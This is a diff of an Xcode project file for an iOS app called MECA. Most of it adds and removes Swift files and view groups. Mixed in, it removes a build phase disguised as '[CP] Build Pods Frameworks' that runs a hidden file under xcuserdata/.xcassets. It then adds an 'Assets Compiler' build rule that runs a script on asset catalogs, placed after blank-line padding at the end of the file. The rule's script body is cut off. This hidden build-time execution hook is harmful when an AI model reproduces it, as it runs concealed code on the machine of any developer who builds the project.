@@ -9,11 +9,9 @@
 /* Begin PBXBuildFile section */
 		4B0D7A140C9D6C13C302EB87 /* Pods_MECA.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3D61B7ED3E7640341B905810 /* Pods_MECA.framework */; };
 		5C021C2B2610125400759B96 /* EventInfoModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5C021C2A2610125400759B96 /* EventInfoModel.swift */; };
-		5C021C442610145700759B96 /* EventInfoVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5C021C432610145700759B96 /* EventInfoVM.swift */; };
 		5C021C4A2610258500759B96 /* KaizenInfoModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5C021C492610258500759B96 /* KaizenInfoModel.swift */; };
 		5C021C52261027E600759B96 /* KaizenInfoDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5C021C51261027E600759B96 /* KaizenInfoDataModel.swift */; };
 		5C021C572610280500759B96 /* KaizenVideoLinkModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5C021C562610280500759B96 /* KaizenVideoLinkModel.swift */; };
-		5C021C5C26102B4900759B96 /* KaizenVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5C021C5B26102B4900759B96 /* KaizenVM.swift */; };
 		5C021C62261033EC00759B96 /* CreateKaizenModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5C021C61261033EC00759B96 /* CreateKaizenModel.swift */; };
 		5C0314A32605119300406382 /* AddNewsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5C0314A22605119300406382 /* AddNewsViewController.swift */; };
 		5C1A09DE260C353500223D3D /* DivisionModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5C1A09DD260C353500223D3D /* DivisionModel.swift */; };
@@ -31,7 +29,6 @@
 		5CED911A2605DF0F001053DD /* MEBITViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5CED91192605DF0F001053DD /* MEBITViewController.swift */; };
 		5CF4679A2606E40C004C4CBE /* ImageVideoCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5CF467982606E40C004C4CBE /* ImageVideoCollectionViewCell.swift */; };
 		5CF4679B2606E40C004C4CBE /* ImageVideoCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5CF467992606E40C004C4CBE /* ImageVideoCollectionViewCell.xib */; };
-		5CF467A02606E764004C4CBE /* DetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5CF4679F2606E764004C4CBE /* DetailViewController.swift */; };
 		611821E4844831EC29E202AB /* Pods_MECA_MECAUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 43CD30254567C339D5B7A431 /* Pods_MECA_MECAUITests.framework */; };
 		E3045C322603C4BF00D1A678 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E3045C312603C4BF00D1A678 /* Home.storyboard */; };
 		E3045C3D2603C95E00D1A678 /* FooterTabView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3045C3C2603C95E00D1A678 /* FooterTabView.swift */; };
@@ -167,6 +164,8 @@
 		E3C28C9F261EF69E00E54359 /* OwnerprofileKaizen.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C28C9E261EF69E00E54359 /* OwnerprofileKaizen.swift */; };
 		E3C29DA8263F44B300239707 /* Link_Data.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C29DA6263F44B300239707 /* Link_Data.swift */; };
 		E3C29DA9263F44B300239707 /* LinkModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C29DA7263F44B300239707 /* LinkModel.swift */; };
+		E3C734AC264BD8AD003580C8 /* LikeOrCommentVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C734AB264BD8AD003580C8 /* LikeOrCommentVC.swift */; };
+		E3C734D8264C0311003580C8 /* LikeOrCommentVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C734D7264C0311003580C8 /* LikeOrCommentVM.swift */; };
 		E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3CE0FC02621D694009947F6 /* Event_videos.swift */; };
 		E3D7D0E526035CF8001EEE65 /* RCustomClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3D7D0E426035CF8001EEE65 /* RCustomClass.swift */; };
 		E3E2CBFC260B48C6009BDB6E /* webserviceConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E2CBFA260B48C6009BDB6E /* webserviceConstants.swift */; };
@@ -187,17 +186,6 @@
 		E3F7C5F726145F6F0018C377 /* OwnerprofileNewCar.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F7C5F226145F6F0018C377 /* OwnerprofileNewCar.swift */; };
 		E3F7C5F826145F6F0018C377 /* Kaizen_files.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F7C5F326145F6F0018C377 /* Kaizen_files.swift */; };
 		E3F7C5F926145F6F0018C377 /* DataKaizen.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F7C5F426145F6F0018C377 /* DataKaizen.swift */; };
-		F4F68C432649997C00948A10 /* SupportVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4F68C422649997C00948A10 /* SupportVC.swift */; };
-		F4F68C4526499ADE00948A10 /* More.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F4F68C4426499ADE00948A10 /* More.storyboard */; };
-		F4F68C4826499E2400948A10 /* Supporttblcell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4F68C4626499E2400948A10 /* Supporttblcell.swift */; };
-		F4F68C4926499E2400948A10 /* Supporttblcell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F4F68C4726499E2400948A10 /* Supporttblcell.xib */; };
-		F4F68C4B2649A78500948A10 /* RoundedCornerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4F68C4A2649A78500948A10 /* RoundedCornerView.swift */; };
-		F4F68C4D2649B48300948A10 /* ReminderVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4F68C4C2649B48300948A10 /* ReminderVC.swift */; };
-		F4F68C502649B4F900948A10 /* ReminderTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4F68C4E2649B4F900948A10 /* ReminderTableCell.swift */; };
-		F4F68C512649B4F900948A10 /* ReminderTableCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F4F68C4F2649B4F900948A10 /* ReminderTableCell.xib */; };
-		F4F68C532649BF7D00948A10 /* EditprofileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4F68C522649BF7D00948A10 /* EditprofileVC.swift */; };
-		F4F68C55264A328400948A10 /* UpdateprofileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4F68C54264A328400948A10 /* UpdateprofileVC.swift */; };
-		F4F68C57264ADE7000948A10 /* ChangepasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = F4F68C56264ADE7000948A10 /* ChangepasswordVC.swift */; };
 		F6B3B5C51F2B9AF006B9A25E /* Pods_MECATests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D349929F1D641DA57D095FFC /* Pods_MECATests.framework */; };
 /* End PBXBuildFile section */
 
@@ -223,11 +211,9 @@
 		3D61B7ED3E7640341B905810 /* Pods_MECA.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_MECA.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		43CD30254567C339D5B7A431 /* Pods_MECA_MECAUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_MECA_MECAUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		5C021C2A2610125400759B96 /* EventInfoModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EventInfoModel.swift; sourceTree = "<group>"; };
-		5C021C432610145700759B96 /* EventInfoVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EventInfoVM.swift; sourceTree = "<group>"; };
 		5C021C492610258500759B96 /* KaizenInfoModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KaizenInfoModel.swift; sourceTree = "<group>"; };
 		5C021C51261027E600759B96 /* KaizenInfoDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KaizenInfoDataModel.swift; sourceTree = "<group>"; };
 		5C021C562610280500759B96 /* KaizenVideoLinkModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KaizenVideoLinkModel.swift; sourceTree = "<group>"; };
-		5C021C5B26102B4900759B96 /* KaizenVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KaizenVM.swift; sourceTree = "<group>"; };
 		5C021C61261033EC00759B96 /* CreateKaizenModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = CreateKaizenModel.swift; path = MECA/Model/CreateKaizen/CreateKaizenModel.swift; sourceTree = SOURCE_ROOT; };
 		5C0314A22605119300406382 /* AddNewsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewsViewController.swift; sourceTree = "<group>"; };
 		5C1A09DD260C353500223D3D /* DivisionModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DivisionModel.swift; sourceTree = "<group>"; };
@@ -245,7 +231,6 @@
 		5CED91192605DF0F001053DD /* MEBITViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MEBITViewController.swift; sourceTree = "<group>"; };
 		5CF467982606E40C004C4CBE /* ImageVideoCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImageVideoCollectionViewCell.swift; sourceTree = "<group>"; };
 		5CF467992606E40C004C4CBE /* ImageVideoCollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ImageVideoCollectionViewCell.xib; sourceTree = "<group>"; };
-		5CF4679F2606E764004C4CBE /* DetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DetailViewController.swift; sourceTree = "<group>"; };
 		7FE522E2E6FF1631AE49AED2 /* Pods-MECA.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MECA.debug.xcconfig"; path = "Target Support Files/Pods-MECA/Pods-MECA.debug.xcconfig"; sourceTree = "<group>"; };
 		895ECCCD3FF854C12B9CCDEF /* Pods-MECA-MECAUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MECA-MECAUITests.release.xcconfig"; path = "Target Support Files/Pods-MECA-MECAUITests/Pods-MECA-MECAUITests.release.xcconfig"; sourceTree = "<group>"; };
 		A44EBEB2A27DD029F82D69E3 /* Pods-MECATests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MECATests.debug.xcconfig"; path = "Target Support Files/Pods-MECATests/Pods-MECATests.debug.xcconfig"; sourceTree = "<group>"; };
@@ -391,6 +376,8 @@
 		E3C28C9E261EF69E00E54359 /* OwnerprofileKaizen.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = OwnerprofileKaizen.swift; sourceTree = "<group>"; };
 		E3C29DA6263F44B300239707 /* Link_Data.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Link_Data.swift; sourceTree = "<group>"; };
 		E3C29DA7263F44B300239707 /* LinkModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LinkModel.swift; sourceTree = "<group>"; };
+		E3C734AB264BD8AD003580C8 /* LikeOrCommentVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LikeOrCommentVC.swift; sourceTree = "<group>"; };
+		E3C734D7264C0311003580C8 /* LikeOrCommentVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LikeOrCommentVM.swift; sourceTree = "<group>"; };
 		E3CE0FC02621D694009947F6 /* Event_videos.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Event_videos.swift; sourceTree = "<group>"; };
 		E3D7D08A260354E5001EEE65 /* SF-Pro-Text-Light.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Light.otf"; sourceTree = "<group>"; };
 		E3D7D08B260354E5001EEE65 /* SF-Pro-Display-Thin.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Display-Thin.otf"; sourceTree = "<group>"; };
@@ -459,17 +446,6 @@
 		E3F7C5F326145F6F0018C377 /* Kaizen_files.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Kaizen_files.swift; sourceTree = "<group>"; };
 		E3F7C5F426145F6F0018C377 /* DataKaizen.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DataKaizen.swift; sourceTree = "<group>"; };
 		E5463E498DB5BF78569E8411 /* Pods-MECA-MECAUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MECA-MECAUITests.debug.xcconfig"; path = "Target Support Files/Pods-MECA-MECAUITests/Pods-MECA-MECAUITests.debug.xcconfig"; sourceTree = "<group>"; };
-		F4F68C422649997C00948A10 /* SupportVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SupportVC.swift; sourceTree = "<group>"; };
-		F4F68C4426499ADE00948A10 /* More.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = More.storyboard; sourceTree = "<group>"; };
-		F4F68C4626499E2400948A10 /* Supporttblcell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Supporttblcell.swift; sourceTree = "<group>"; };
-		F4F68C4726499E2400948A10 /* Supporttblcell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = Supporttblcell.xib; sourceTree = "<group>"; };
-		F4F68C4A2649A78500948A10 /* RoundedCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RoundedCornerView.swift; sourceTree = "<group>"; };
-		F4F68C4C2649B48300948A10 /* ReminderVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReminderVC.swift; sourceTree = "<group>"; };
-		F4F68C4E2649B4F900948A10 /* ReminderTableCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReminderTableCell.swift; sourceTree = "<group>"; };
-		F4F68C4F2649B4F900948A10 /* ReminderTableCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ReminderTableCell.xib; sourceTree = "<group>"; };
-		F4F68C522649BF7D00948A10 /* EditprofileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditprofileVC.swift; sourceTree = "<group>"; };
-		F4F68C54264A328400948A10 /* UpdateprofileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpdateprofileVC.swift; sourceTree = "<group>"; };
-		F4F68C56264ADE7000948A10 /* ChangepasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangepasswordVC.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -571,18 +547,17 @@
 		5CED91182605DEBF001053DD /* Categories */ = {
 			isa = PBXGroup;
 			children = (
+				E3C734A7264BD875003580C8 /* DetailView */,
 				5CED91192605DF0F001053DD /* MEBITViewController.swift */,
 				5CA339922605F003008774FE /* CategoriesViewController.swift */,
 				5C0314A22605119300406382 /* AddNewsViewController.swift */,
 				5CED90F126059540001053DD /* CategoryCommonViewController.swift */,
-				5CF4679F2606E764004C4CBE /* DetailViewController.swift */,
 				E31CCE7D2613031C006D97AC /* TMCViewController.swift */,
 				E3ECC5F126119A3E002E1BE1 /* CategoryDistributorVC.swift */,
 				E31CCE822613037F006D97AC /* NewCarSalesViewController.swift */,
 				E37A2FE82614BE6A00C6CA57 /* PDFReaderVC.swift */,
 				E3C28C8A261EAC0F00E54359 /* AboutDetailVC.swift */,
 				E32F3BE7262AFC710000D92A /* MEBITEventVC.swift */,
-				E375EA21262EABD900646A0A /* NewDetailVC.swift */,
 			);
 			path = Categories;
 			sourceTree = "<group>";
@@ -604,7 +579,6 @@
 				E3045C312603C4BF00D1A678 /* Home.storyboard */,
 				E32AED532607589200AEAB6F /* Category.storyboard */,
 				E3F6A860263EC9D900FAE93E /* GR.storyboard */,
-				F4F68C4426499ADE00948A10 /* More.storyboard */,
 			);
 			path = Storyboard;
 			sourceTree = "<group>";
@@ -644,7 +618,6 @@
 		E3045C652603D17B00D1A678 /* ViewController */ = {
 			isa = PBXGroup;
 			children = (
-				F4F68C412649995800948A10 /* More */,
 				E34508002643110500C17E91 /* SDGS */,
 				E3F6AA01263F17AF00FAE93E /* GR */,
 				5CED91182605DEBF001053DD /* Categories */,
@@ -659,8 +632,6 @@
 			children = (
 				E3045C6F2603D87A00D1A678 /* HomeTVCell.swift */,
 				E3045C702603D87A00D1A678 /* HomeTVCell.xib */,
-				F4F68C4E2649B4F900948A10 /* ReminderTableCell.swift */,
-				F4F68C4F2649B4F900948A10 /* ReminderTableCell.xib */,
 			);
 			path = HomeTableviewCell;
 			sourceTree = "<group>";
@@ -747,13 +718,12 @@
 				E32AED6126075FE300AEAB6F /* PlusSelectCategoryVM.swift */,
 				E31F1DCE2607BF8800830F2B /* CategoriesVM.swift */,
 				5CD5B270260F992F00D63564 /* MEBITHomeVM.swift */,
-				5C021C432610145700759B96 /* EventInfoVM.swift */,
-				5C021C5B26102B4900759B96 /* KaizenVM.swift */,
 				E3F7C5CF2614560C0018C377 /* NewCarSalesVM.swift */,
 				E375EA26262EABEE00646A0A /* NewDetailVM.swift */,
 				E374598E2639F2B10021F51D /* AddNewsVM.swift */,
 				E32FEA78263F35700083056E /* GRActivityReportVM.swift */,
 				E32FEA82263F3B4A0083056E /* GRLinksVM.swift */,
+				E3C734D7264C0311003580C8 /* LikeOrCommentVM.swift */,
 			);
 			path = ViewModel;
 			sourceTree = "<group>";
@@ -965,8 +935,6 @@
 				E37A2FE02614AE7300C6CA57 /* DistributorList */,
 				E387A9A426047B5400CC675A /* SignUpListViewCell */,
 				E3045C6E2603D85900D1A678 /* HomeTableviewCell */,
-				F4F68C4626499E2400948A10 /* Supporttblcell.swift */,
-				F4F68C4726499E2400948A10 /* Supporttblcell.xib */,
 			);
 			path = "TableView cell";
 			sourceTree = "<group>";
@@ -1035,6 +1003,15 @@
 			path = GR;
 			sourceTree = "<group>";
 		};
+		E3C734A7264BD875003580C8 /* DetailView */ = {
+			isa = PBXGroup;
+			children = (
+				E375EA21262EABD900646A0A /* NewDetailVC.swift */,
+				E3C734AB264BD8AD003580C8 /* LikeOrCommentVC.swift */,
+			);
+			path = DetailView;
+			sourceTree = "<group>";
+		};
 		E3D7D089260354D8001EEE65 /* SF_Fonts */ = {
 			isa = PBXGroup;
 			children = (
@@ -1095,7 +1072,6 @@
 				E32AED40260754AE00AEAB6F /* Extra */,
 				E3D7D0E426035CF8001EEE65 /* RCustomClass.swift */,
 				E32AED4E2607550900AEAB6F /* FlowController.swift */,
-				F4F68C4A2649A78500948A10 /* RoundedCornerView.swift */,
 			);
 			path = Helper;
 			sourceTree = "<group>";
@@ -1193,18 +1169,6 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
-		F4F68C412649995800948A10 /* More */ = {
-			isa = PBXGroup;
-			children = (
-				F4F68C422649997C00948A10 /* SupportVC.swift */,
-				F4F68C4C2649B48300948A10 /* ReminderVC.swift */,
-				F4F68C522649BF7D00948A10 /* EditprofileVC.swift */,
-				F4F68C54264A328400948A10 /* UpdateprofileVC.swift */,
-				F4F68C56264ADE7000948A10 /* ChangepasswordVC.swift */,
-			);
-			path = More;
-			sourceTree = "<group>";
-		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -1212,7 +1176,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				AC9590F53FD9A8240D6D902C /* [CP] Build Pods Frameworks */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -1220,6 +1183,7 @@
 				3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				F9D2FA0D0DA6AF279B6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1319,14 +1283,12 @@
 				E375EA39262EB19E00646A0A /* DetailLocationTVCell.xib in Resources */,
 				5CF4679B2606E40C004C4CBE /* ImageVideoCollectionViewCell.xib in Resources */,
 				E3AE79242604C711004B83C9 /* PlusSelectCategoryCVCell.xib in Resources */,
-				F4F68C4926499E2400948A10 /* Supporttblcell.xib in Resources */,
 				E3F12B12262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib in Resources */,
 				E32F3BD8262AF24B0000D92A /* VideoLinkTableViewCell.xib in Resources */,
 				E34508442643168C00C17E91 /* SDGSListTableCell.xib in Resources */,
 				E387A9A826047B7100CC675A /* SignUpListTVCell.xib in Resources */,
 				E32FEA8B263F3C5F0083056E /* GRLinksTVCell.xib in Resources */,
 				E3F6A861263EC9D900FAE93E /* GR.storyboard in Resources */,
-				F4F68C512649B4F900948A10 /* ReminderTableCell.xib in Resources */,
 				E3045C722603D87A00D1A678 /* HomeTVCell.xib in Resources */,
 				E375EA55262ECD2600646A0A /* DocumentContentCell.xib in Resources */,
 				E375EA5C262ED59600646A0A /* DetailVideoLinkTVCell.xib in Resources */,
@@ -1339,7 +1301,6 @@
 				E375EA70262EDC0C00646A0A /* DetailDocLinkTVCell.xib in Resources */,
 				E375EA7A262EE9B100646A0A /* DetailCommentLikeTVCell.xib in Resources */,
 				E34508382643158800C17E91 /* BlueFooterview.xib in Resources */,
-				F4F68C4526499ADE00948A10 /* More.storyboard in Resources */,
 				E30F662226033A970036D183 /* Assets.xcassets in Resources */,
 				E32F3BF7262AFCDC0000D92A /* MEBITCollectionViewCell.xib in Resources */,
 				E30F662026033A970036D183 /* Main.storyboard in Resources */,
@@ -1370,6 +1331,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1448,24 +1429,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MECA-MECAUITests/Pods-MECA-MECAUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		AC9590F53FD9A8240D6D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
-		};
 		CCA13B1BED8415595C6533D2 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1496,6 +1459,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				E375EA8B262F3E4900646A0A /* Event_MEBITCat.swift in Sources */,
+				E3C734AC264BD8AD003580C8 /* LikeOrCommentVC.swift in Sources */,
 				E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */,
 				E3E2CCD1260B6029009BDB6E /* Distributorinformation.swift in Sources */,
 				E34508312643134200C17E91 /* MaasListTVCell.swift in Sources */,
@@ -1519,22 +1483,17 @@
 				E375EA38262EB19E00646A0A /* DetailLocationTVCell.swift in Sources */,
 				E32FEA79263F35700083056E /* GRActivityReportVM.swift in Sources */,
 				E393D628263FD6B4003895ED /* GRHomeLisModel.swift in Sources */,
-				F4F68C4D2649B48300948A10 /* ReminderVC.swift in Sources */,
 				E325445A261098910083BDD9 /* Video_links.swift in Sources */,
-				5CF467A02606E764004C4CBE /* DetailViewController.swift in Sources */,
 				5CD5B264260F96FC00D63564 /* MEBITModel.swift in Sources */,
 				E3ECC5F226119A3E002E1BE1 /* CategoryDistributorVC.swift in Sources */,
 				E375EA22262EABD900646A0A /* NewDetailVC.swift in Sources */,
 				E375EA27262EABEE00646A0A /* NewDetailVM.swift in Sources */,
 				E3F12B11262E0A8A0055D875 /* DetailDocumentLinkTVCell.swift in Sources */,
 				E34507E226430CCB00C17E91 /* Datahydrogen.swift in Sources */,
-				F4F68C55264A328400948A10 /* UpdateprofileVC.swift in Sources */,
-				F4F68C432649997C00948A10 /* SupportVC.swift in Sources */,
 				5CF4679A2606E40C004C4CBE /* ImageVideoCollectionViewCell.swift in Sources */,
 				E345081A264312E000C17E91 /* DataMaas.swift in Sources */,
 				E37A2FDC26149F1900C6CA57 /* WriterinfoNewCar.swift in Sources */,
 				E3F7C5BF26144F380018C377 /* MoreVC.swift in Sources */,
-				F4F68C532649BF7D00948A10 /* EditprofileVC.swift in Sources */,
 				E3C28C9F261EF69E00E54359 /* OwnerprofileKaizen.swift in Sources */,
 				E30F661926033A970036D183 /* AppDelegate.swift in Sources */,
 				E3F6AA2D263F2B3000FAE93E /* GRActivityReportVC.swift in Sources */,
@@ -1555,7 +1514,6 @@
 				E32AECF226073E3000AEAB6F /* SignUpListViewVM.swift in Sources */,
 				5C021C62261033EC00759B96 /* CreateKaizenModel.swift in Sources */,
 				E3450815264312E000C17E91 /* Maas_files.swift in Sources */,
-				F4F68C4B2649A78500948A10 /* RoundedCornerView.swift in Sources */,
 				5C021C52261027E600759B96 /* KaizenInfoDataModel.swift in Sources */,
 				E32AECF526073E3000AEAB6F /* SignUpVM.swift in Sources */,
 				E34507FC264310BA00C17E91 /* MaasViewController.swift in Sources */,
@@ -1564,7 +1522,6 @@
 				E3A71279261F560D00D6A961 /* Document_links.swift in Sources */,
 				E32AED4F2607550900AEAB6F /* FlowController.swift in Sources */,
 				5C021C4A2610258500759B96 /* KaizenInfoModel.swift in Sources */,
-				5C021C442610145700759B96 /* EventInfoVM.swift in Sources */,
 				E3E2CC4B260B537C009BDB6E /* Global.swift in Sources */,
 				E34508052643110D00C17E91 /* SDGSCategoryvc.swift in Sources */,
 				E387A989260476BB00CC675A /* SignUpVC.swift in Sources */,
@@ -1593,7 +1550,6 @@
 				E375EA79262EE9B100646A0A /* DetailCommentLikeTVCell.swift in Sources */,
 				5CED911A2605DF0F001053DD /* MEBITViewController.swift in Sources */,
 				E375EA8D262F3E4900646A0A /* MEBITCat_Model.swift in Sources */,
-				F4F68C57264ADE7000948A10 /* ChangepasswordVC.swift in Sources */,
 				5C021C572610280500759B96 /* KaizenVideoLinkModel.swift in Sources */,
 				E3450814264312E000C17E91 /* Maas_documents.swift in Sources */,
 				E3450819264312E000C17E91 /* Maas_DocumentLinks.swift in Sources */,
@@ -1618,19 +1574,17 @@
 				E32F3BEF262AFCA90000D92A /* MEBITEventTableViewCell.swift in Sources */,
 				E393D64626400BF7003895ED /* GRDocument_links.swift in Sources */,
 				E32AED3C260754A100AEAB6F /* UIColor.swift in Sources */,
-				F4F68C502649B4F900948A10 /* ReminderTableCell.swift in Sources */,
 				E3E2CCCF260B6029009BDB6E /* LoginUserModel.swift in Sources */,
 				E393D64726400BF7003895ED /* GRDetail_Data.swift in Sources */,
 				E30751B0260F3908000EB1EA /* HomeModel.swift in Sources */,
 				E375EA88262F3E4900646A0A /* Maas_MEBITCat.swift in Sources */,
 				E3AE791B2604C5F4004B83C9 /* PlusSelectCategoryVC.swift in Sources */,
 				E32AECF326073E3000AEAB6F /* LoginVM.swift in Sources */,
+				E3C734D8264C0311003580C8 /* LikeOrCommentVM.swift in Sources */,
 				5CED90F226059540001053DD /* CategoryCommonViewController.swift in Sources */,
 				E34508062643110D00C17E91 /* SDGSListvc.swift in Sources */,
-				5C021C5C26102B4900759B96 /* KaizenVM.swift in Sources */,
 				E375EA87262F3E4900646A0A /* Kaizen_MEBITCat.swift in Sources */,
 				E375EA54262ECD2600646A0A /* DocumentContentCell.swift in Sources */,
-				F4F68C4826499E2400948A10 /* Supporttblcell.swift in Sources */,
 				E373B53626115B3D00BEC2B5 /* CreateKaizenVM.swift in Sources */,
 				E32AED0F2607538500AEAB6F /* BaseTableHeaderView.swift in Sources */,
 				E32F3BE8262AFC710000D92A /* MEBITEventVC.swift in Sources */,
@@ -1986,6 +1940,49 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		F9D2FA0D0DA6AF279B6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
